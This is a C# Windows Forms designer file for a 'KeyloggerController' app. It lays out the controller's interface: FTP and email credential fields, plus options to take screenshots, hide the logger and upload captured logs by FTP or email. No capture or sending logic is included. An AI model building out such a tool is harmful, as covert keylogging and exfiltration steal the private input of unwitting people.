namespace KeyloggerController
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.btnStart = new System.Windows.Forms.Button();
            this.btnStop = new System.Windows.Forms.Button();
            this.grpFTP = new System.Windows.Forms.GroupBox();
            this.txtFTPPass = new System.Windows.Forms.TextBox();
            this.txtFTPUser = new System.Windows.Forms.TextBox();
            this.txtFTPHost = new System.Windows.Forms.TextBox();
            this.grpEmail = new System.Windows.Forms.GroupBox();
            this.txtEmailTo = new System.Windows.Forms.TextBox();
            this.txtEmailPass = new System.Windows.Forms.TextBox();
            this.txtEmailFrom = new System.Windows.Forms.TextBox();
            this.txtScreenshotWindow = new System.Windows.Forms.TextBox();
            this.txtEmailPort = new System.Windows.Forms.TextBox();
            this.txtEmailHost = new System.Windows.Forms.TextBox();
            this.grpCheck = new System.Windows.Forms.GroupBox();
            this.checkSpecific = new System.Windows.Forms.CheckBox();
            this.btnRefresh = new System.Windows.Forms.Button();
            this.lstLogs = new System.Windows.Forms.ListBox();
            this.btnValidateFTP = new System.Windows.Forms.Button();
            this.checkHide = new System.Windows.Forms.CheckBox();
            this.checkFTP = new System.Windows.Forms.CheckBox();
            this.checkEmail = new System.Windows.Forms.CheckBox();
            this.checkScreenshot = new System.Windows.Forms.CheckBox();
            this.backgroundWorker1 = new System.ComponentModel.BackgroundWorker();
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.grpFTP.SuspendLayout();
            this.grpEmail.SuspendLayout();
            this.grpCheck.SuspendLayout();
            this.SuspendLayout();
            // 
            // btnStart
            // 
            this.btnStart.Location = new System.Drawing.Point(342, 15);
            this.btnStart.Name = "btnStart";
            this.btnStart.Size = new System.Drawing.Size(81, 23);
            this.btnStart.TabIndex = 0;
            this.btnStart.Text = "Start";
            this.btnStart.UseVisualStyleBackColor = true;
            this.btnStart.Click += new System.EventHandler(this.btnStart_Click);
            // 
            // btnStop
            // 
            this.btnStop.Location = new System.Drawing.Point(342, 41);
            this.btnStop.Name = "btnStop";
            this.btnStop.Size = new System.Drawing.Size(81, 23);
            this.btnStop.TabIndex = 1;
            this.btnStop.Text = "Stop";
            this.btnStop.UseVisualStyleBackColor = true;
            this.btnStop.Click += new System.EventHandler(this.btnStop_Click);
            // 
            // grpFTP
            // 
            this.grpFTP.Controls.Add(this.txtFTPPass);
            this.grpFTP.Controls.Add(this.txtFTPUser);
            this.grpFTP.Controls.Add(this.txtFTPHost);
            this.grpFTP.Location = new System.Drawing.Point(12, 12);
            this.grpFTP.Name = "grpFTP";
            this.grpFTP.Size = new System.Drawing.Size(163, 100);
            this.grpFTP.TabIndex = 2;
            this.grpFTP.TabStop = false;
            this.grpFTP.Text = "FTP";
            // 
            // txtFTPPass
            // 
            this.txtFTPPass.Location = new System.Drawing.Point(6, 71);
            this.txtFTPPass.Name = "txtFTPPass";
            this.txtFTPPass.PasswordChar = '*';
            this.txtFTPPass.Size = new System.Drawing.Size(151, 20);
            this.txtFTPPass.TabIndex = 2;
            this.txtFTPPass.Text = "Pass";
            this.txtFTPPass.TextChanged += new System.EventHandler(this.txtFTPPass_TextChanged);
            // 
            // txtFTPUser
            // 
            this.txtFTPUser.Location = new System.Drawing.Point(6, 45);
            this.txtFTPUser.Name = "txtFTPUser";
            this.txtFTPUser.Size = new System.Drawing.Size(151, 20);
            this.txtFTPUser.TabIndex = 1;
            this.txtFTPUser.Text = "User";
            this.txtFTPUser.TextChanged += new System.EventHandler(this.txtFTPUser_TextChanged);
            // 
            // txtFTPHost
            // 
            this.txtFTPHost.Location = new System.Drawing.Point(6, 19);
            this.txtFTPHost.Name = "txtFTPHost";
            this.txtFTPHost.Size = new System.Drawing.Size(151, 20);
            this.txtFTPHost.TabIndex = 0;
            this.txtFTPHost.Text = "Host";
            this.txtFTPHost.TextChanged += new System.EventHandler(this.txtFTPHost_TextChanged);
            // 
            // grpEmail
            // 
            this.grpEmail.Controls.Add(this.txtEmailTo);
            this.grpEmail.Controls.Add(this.txtEmailPass);
            this.grpEmail.Controls.Add(this.txtEmailFrom);
            this.grpEmail.Controls.Add(this.txtScreenshotWindow);
            this.grpEmail.Controls.Add(this.txtEmailPort);
            this.grpEmail.Controls.Add(this.txtEmailHost);
            this.grpEmail.Location = new System.Drawing.Point(181, 12);
            this.grpEmail.Name = "grpEmail";
            this.grpEmail.Size = new System.Drawing.Size(260, 100);
            this.grpEmail.TabIndex = 3;
            this.grpEmail.TabStop = false;
            this.grpEmail.Text = "Email";
            // 
            // txtEmailTo
            // 
            this.txtEmailTo.Location = new System.Drawing.Point(112, 71);
            this.txtEmailTo.Name = "txtEmailTo";
            this.txtEmailTo.Size = new System.Drawing.Size(142, 20);
            this.txtEmailTo.TabIndex = 8;
            this.txtEmailTo.Text = "To";
            this.txtEmailTo.TextChanged += new System.EventHandler(this.txtEmailTo_TextChanged);
            // 
            // txtEmailPass
            // 
            this.txtEmailPass.Location = new System.Drawing.Point(112, 45);
            this.txtEmailPass.Name = "txtEmailPass";
            this.txtEmailPass.PasswordChar = '*';
            this.txtEmailPass.Size = new System.Drawing.Size(142, 20);
            this.txtEmailPass.TabIndex = 7;
            this.txtEmailPass.Text = "Password";
            this.txtEmailPass.TextChanged += new System.EventHandler(this.txtEmailPass_TextChanged);
            // 
            // txtEmailFrom
            // 
            this.txtEmailFrom.Location = new System.Drawing.Point(112, 19);
            this.txtEmailFrom.Name = "txtEmailFrom";
            this.txtEmailFrom.Size = new System.Drawing.Size(142, 20);
            this.txtEmailFrom.TabIndex = 6;
            this.txtEmailFrom.Text = "From";
            this.txtEmailFrom.TextChanged += new System.EventHandler(this.txtEmailFrom_TextChanged);
            // 
            // txtScreenshotWindow
            // 
            this.txtScreenshotWindow.Location = new System.Drawing.Point(6, 71);
            this.txtScreenshotWindow.Name = "txtScreenshotWindow";
            this.txtScreenshotWindow.Size = new System.Drawing.Size(100, 20);
            this.txtScreenshotWindow.TabIndex = 5;
            this.txtScreenshotWindow.Text = "Screenshot Window";
            this.txtScreenshotWindow.TextChanged += new System.EventHandler(this.txtScreenshotWindow_TextChanged);
            // 
            // txtEmailPort
            // 
            this.txtEmailPort.Location = new System.Drawing.Point(6, 45);
            this.txtEmailPort.Name = "txtEmailPort";
            this.txtEmailPort.Size = new System.Drawing.Size(100, 20);
            this.txtEmailPort.TabIndex = 4;
            this.txtEmailPort.Text = "Port";
            this.txtEmailPort.TextChanged += new System.EventHandler(this.txtEmailPort_TextChanged);
            // 
            // txtEmailHost
            // 
            this.txtEmailHost.Location = new System.Drawing.Point(6, 19);
            this.txtEmailHost.Name = "txtEmailHost";
            this.txtEmailHost.Size = new System.Drawing.Size(100, 20);
            this.txtEmailHost.TabIndex = 3;
            this.txtEmailHost.Text = "Host";
            this.txtEmailHost.TextChanged += new System.EventHandler(this.txtEmailHost_TextChanged);
            // 
            // grpCheck
            // 
            this.grpCheck.Controls.Add(this.checkSpecific);
            this.grpCheck.Controls.Add(this.btnRefresh);
            this.grpCheck.Controls.Add(this.lstLogs);
            this.grpCheck.Controls.Add(this.btnValidateFTP);
            this.grpCheck.Controls.Add(this.checkHide);
            this.grpCheck.Controls.Add(this.checkFTP);
            this.grpCheck.Controls.Add(this.checkEmail);
            this.grpCheck.Controls.Add(this.checkScreenshot);
            this.grpCheck.Controls.Add(this.btnStart);
            this.grpCheck.Controls.Add(this.btnStop);
            this.grpCheck.Location = new System.Drawing.Point(12, 118);
            this.grpCheck.Name = "grpCheck";
            this.grpCheck.Size = new System.Drawing.Size(429, 131);
            this.grpCheck.TabIndex = 3;
            this.grpCheck.TabStop = false;
            this.grpCheck.Text = "Check";
            // 
            // checkSpecific
            // 
            this.checkSpecific.AutoSize = true;
            this.checkSpecific.Location = new System.Drawing.Point(6, 39);
            this.checkSpecific.Name = "checkSpecific";
            this.checkSpecific.Size = new System.Drawing.Size(101, 17);
            this.checkSpecific.TabIndex = 9;
            this.checkSpecific.Text = "Specific logging";
            this.checkSpecific.UseVisualStyleBackColor = true;
            this.checkSpecific.CheckedChanged += new System.EventHandler(this.checkSpecific_CheckedChanged);
            // 
            // btnRefresh
            // 
            this.btnRefresh.Location = new System.Drawing.Point(342, 100);
            this.btnRefresh.Name = "btnRefresh";
            this.btnRefresh.Size = new System.Drawing.Size(81, 23);
            this.btnRefresh.TabIndex = 8;
            this.btnRefresh.Text = "Refresh Logs";
            this.btnRefresh.UseVisualStyleBackColor = true;
            this.btnRefresh.Click += new System.EventHandler(this.btnRefresh_Click);
            // 
            // lstLogs
            // 
            this.lstLogs.FormattingEnabled = true;
            this.lstLogs.Location = new System.Drawing.Point(125, 15);
            this.lstLogs.Name = "lstLogs";
            this.lstLogs.Size = new System.Drawing.Size(211, 108);
            this.lstLogs.TabIndex = 7;
            this.lstLogs.DoubleClick += new System.EventHandler(this.lstLogs_DoubleClick);
            // 
            // btnValidateFTP
            // 
            this.btnValidateFTP.Location = new System.Drawing.Point(342, 70);
            this.btnValidateFTP.Name = "btnValidateFTP";
            this.btnValidateFTP.Size = new System.Drawing.Size(81, 26);
            this.btnValidateFTP.TabIndex = 6;
            this.btnValidateFTP.Text = "Validate FTP";
            this.btnValidateFTP.UseVisualStyleBackColor = true;
            this.btnValidateFTP.Click += new System.EventHandler(this.btnValidateFTP_Click);
            // 
            // checkHide
            // 
            this.checkHide.AutoSize = true;
            this.checkHide.Location = new System.Drawing.Point(6, 108);
            this.checkHide.Name = "checkHide";
            this.checkHide.Size = new System.Drawing.Size(48, 17);
            this.checkHide.TabIndex = 5;
            this.checkHide.Text = "Hide";
            this.checkHide.UseVisualStyleBackColor = true;
            this.checkHide.CheckedChanged += new System.EventHandler(this.checkHide_CheckedChanged);
            // 
            // checkFTP
            // 
            this.checkFTP.AutoSize = true;
            this.checkFTP.Location = new System.Drawing.Point(6, 62);
            this.checkFTP.Name = "checkFTP";
            this.checkFTP.Size = new System.Drawing.Size(95, 17);
            this.checkFTP.TabIndex = 4;
            this.checkFTP.Text = "Upload to FTP";
            this.checkFTP.UseVisualStyleBackColor = true;
            this.checkFTP.CheckedChanged += new System.EventHandler(this.checkFTP_CheckedChanged);
            // 
            // checkEmail
            // 
            this.checkEmail.AutoSize = true;
            this.checkEmail.Location = new System.Drawing.Point(6, 85);
            this.checkEmail.Name = "checkEmail";
            this.checkEmail.Size = new System.Drawing.Size(79, 17);
            this.checkEmail.TabIndex = 3;
            this.checkEmail.Text = "Send Email";
            this.checkEmail.UseVisualStyleBackColor = true;
            this.checkEmail.CheckedChanged += new System.EventHandler(this.checkEmail_CheckedChanged);
            // 
            // checkScreenshot
            // 
            this.checkScreenshot.AutoSize = true;
            this.checkScreenshot.Location = new System.Drawing.Point(6, 16);
            this.checkScreenshot.Name = "checkScreenshot";
            this.checkScreenshot.Size = new System.Drawing.Size(113, 17);
            this.checkScreenshot.TabIndex = 2;
            this.checkScreenshot.Text = "Take Screenshots";
            this.checkScreenshot.UseVisualStyleBackColor = true;
            this.checkScreenshot.CheckedChanged += new System.EventHandler(this.checkScreenshot_CheckedChanged);
            // 
            // backgroundWorker1
            // 
            this.backgroundWorker1.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker1_DoWork);
            // 
            // statusStrip1
            // 
            this.statusStrip1.Location = new System.Drawing.Point(0, 257);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.Size = new System.Drawing.Size(453, 22);
            this.statusStrip1.TabIndex = 4;
            this.statusStrip1.Text = "statusStrip1";
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(453, 279);
            this.Controls.Add(this.statusStrip1);
            this.Controls.Add(this.grpCheck);
            this.Controls.Add(this.grpEmail);
            this.Controls.Add(this.grpFTP);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.Name = "Form1";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "Controller";
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.Form1_FormClosed);
            this.grpFTP.ResumeLayout(false);
            this.grpFTP.PerformLayout();
            this.grpEmail.ResumeLayout(false);
            this.grpEmail.PerformLayout();
            this.grpCheck.ResumeLayout(false);
            this.grpCheck.PerformLayout();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.Button btnStart;
        private System.Windows.Forms.Button btnStop;
        private System.Windows.Forms.GroupBox grpFTP;
        private System.Windows.Forms.GroupBox grpEmail;
        private System.Windows.Forms.GroupBox grpCheck;
        private System.Windows.Forms.CheckBox checkHide;
        private System.Windows.Forms.CheckBox checkFTP;
        private System.Windows.Forms.CheckBox checkEmail;
        private System.Windows.Forms.CheckBox checkScreenshot;
        private System.Windows.Forms.TextBox txtFTPHost;
        private System.Windows.Forms.TextBox txtFTPPass;
        private System.Windows.Forms.TextBox txtFTPUser;
        private System.Windows.Forms.TextBox txtEmailHost;
        private System.Windows.Forms.TextBox txtEmailPort;
        private System.Windows.Forms.TextBox txtScreenshotWindow;
        private System.Windows.Forms.TextBox txtEmailTo;
        private System.Windows.Forms.TextBox txtEmailPass;
        private System.Windows.Forms.TextBox txtEmailFrom;
        private System.ComponentModel.BackgroundWorker backgroundWorker1;
        private System.Windows.Forms.Button btnValidateFTP;
        private System.Windows.Forms.ListBox lstLogs;
        private System.Windows.Forms.Button btnRefresh;
        private System.Windows.Forms.StatusStrip statusStrip1;
        private System.Windows.Forms.CheckBox checkSpecific;
    }
}

